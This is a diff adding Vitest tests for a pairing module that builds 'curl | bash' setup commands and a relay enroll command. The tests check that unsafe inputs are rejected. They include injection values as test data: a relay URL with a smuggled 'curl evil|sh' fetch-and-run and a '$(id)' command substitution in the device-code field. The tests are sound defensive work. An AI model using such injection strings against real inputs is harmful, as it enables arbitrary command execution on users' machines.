@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { remainingMs, isExpired, fmtCountdown, diagnose, setupCommand } from './pairing';
+import { remainingMs, isExpired, fmtCountdown, diagnose, setupCommand, enrollCommand } from './pairing';
 
 const NOW = 1_700_000_000_000;
 const inMs = (ms: number) => new Date(NOW + ms).toISOString();
@@ -87,5 +87,18 @@ describe('setupCommand', () => {
   });
   it('leaves any other account on the student default', () => {
     expect(setupCommand('https://x/s.sh', 'ABC', false)).toBe('curl -fsSL https://x/s.sh | DECK_PAIR_CODE=ABC bash');
+  });
+  it('passes the device code as an env var, never as an argument', () => {
+    const dc = 'A'.repeat(52);
+    expect(setupCommand('https://x/s.sh', 'ABC', false, 'isolated', '', dc)).toBe(`curl -fsSL https://x/s.sh | sudo DECK_ISOLATED=1 DECK_DEVICE_CODE=${dc} DECK_PAIR_CODE=ABC bash`);
+    expect(setupCommand('https://x/s.sh', 'ABC', false, 'dedicated', '', dc)).toBe(`curl -fsSL https://x/s.sh | DECK_DEVICE_CODE=${dc} DECK_PAIR_CODE=ABC bash`);
+  });
+  it('builds the enroll command with the relay URL and refuses a shell-unsafe one', () => {
+    expect(enrollCommand('wss://deck-relay.devfellowship.com')).toBe('cd ~/cockpit && DECK_RELAY_URL=wss://deck-relay.devfellowship.com npx tsx server/agent.ts --enroll-device');
+    expect(enrollCommand('ws://100.1.2.3:7777')).toContain('DECK_RELAY_URL=ws://100.1.2.3:7777 ');
+    expect(enrollCommand('wss://x.com;curl evil|sh')).toContain('DECK_RELAY_URL=wss://deck-relay.devfellowship.com ');
+  });
+  it('drops a device code that is not plain base32', () => {
+    expect(setupCommand('https://x/s.sh', 'ABC', false, 'dedicated', '', '$(id)')).toBe('curl -fsSL https://x/s.sh | DECK_PAIR_CODE=ABC bash');
   });
 });
